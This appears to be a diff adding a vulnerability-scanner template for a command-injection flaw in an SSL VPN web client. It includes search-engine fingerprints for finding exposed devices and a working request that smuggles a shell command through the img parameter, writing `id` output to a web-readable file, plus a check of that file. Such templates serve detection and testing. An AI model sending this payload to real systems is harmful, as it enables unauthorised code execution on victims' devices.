@@ -1,0 +1,27 @@
+id: sslvpn-client-rce
+
+info:
+  name: SSL VPN Client RCE
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |-
+    Fofa: body="/webui/images/default/default/alert_close.jpg"
+    ZoomEye: "/webui/images/default/default/alert_close.jpg"
+  tags: sslvpn,rce
+  created: 2023/12/06
+
+set:
+  randstr: randomLowercase(6)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /sslvpn/sslvpn_client.php?client=logoImg&img=%20/tmp|echo%20%60id%60%20|tee%20/usr/local/webui/sslvpn/{{randstr}}.txt
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /sslvpn/{{randstr}}.txt
+    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
+expression: r0() && r1()
